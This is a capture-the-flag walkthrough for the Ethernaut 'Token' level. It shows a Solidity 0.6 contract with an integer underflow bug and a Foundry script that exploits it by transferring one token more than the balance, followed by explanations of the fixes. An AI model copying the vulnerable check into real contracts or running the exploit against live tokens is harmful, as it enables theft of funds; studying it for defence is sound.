# Level 5 - Token ⏺⏺

{% embed url="https://ethernaut.openzeppelin.com/level/5" %}

### Level Setup

{% hint style="info" %}
The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

&#x20; Things that might help:

* What is an odometer?
{% endhint %}

### Level Contract

{% embed url="https://github.com/OpenZeppelin/ethernaut/blob/a89c8f7832258655c09fde16e6602c78e5e99dbd/contracts/src/levels/Token.sol" %}

{% code lineNumbers="true" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```
{% endcode %}

### Exploit

The exploit is due to unsafe math in older versions of Solidity. The balance can underflow and cause a huge amount of tokens to be transferred.

1. Sending just 1 more token than the user balance causes the value to underflow.&#x20;

{% tabs %}
{% tab title="Anvil" %}
```bash
make anvil-exploit-level-5

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}

{% tab title="Holesky" %}
```bash
make holesky-exploit-level-5

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Exploit Script" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/main/script/Level5.s.sol" %}

{% code title="script/Level5.s.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256 balance);
}

// ================================================================
// │                         LEVEL 5 - TOKEN                      │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();
        IToken targetContract = IToken(targetContractAddress);
        uint256 userStartingBalance = targetContract.balanceOf(msg.sender);

        vm.startBroadcast();
        targetContract.transfer(address(0), userStartingBalance + 1);
        vm.stopBroadcast();
    }
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

2. Submit instance... 🥳

### Completion Message

{% hint style="info" %}
**NOT NEEDED IN SOLIDITY 0.8.0 AND HIGHER**

Overflows are very common in solidity and must be checked for with control statements such as:

```solidity
if(a + c > a) {
  a = a + c;
}
```

An easier alternative is to use OpenZeppelin's SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:

```solidity
a = a.add(c);
```

If there is an overflow, the code will revert.
{% endhint %}

### Notes

* Integer [overflow/underflow](https://docs.soliditylang.org/en/v0.6.0/security-considerations.html#two-s-complement-underflows-overflows) in Solidity `v0.6.0`
* This could easily be fixed using a different check instead of comparing to zero.

```solidity
if (balances[msg.sender] < _value) revert Token__NotEnoughTokens();
```

{% embed url="https://github.com/nvnx7/ethernaut-openzeppelin-hacks/blob/e936301859334383d568a614084917100319205e/level_5_Token.md" %}
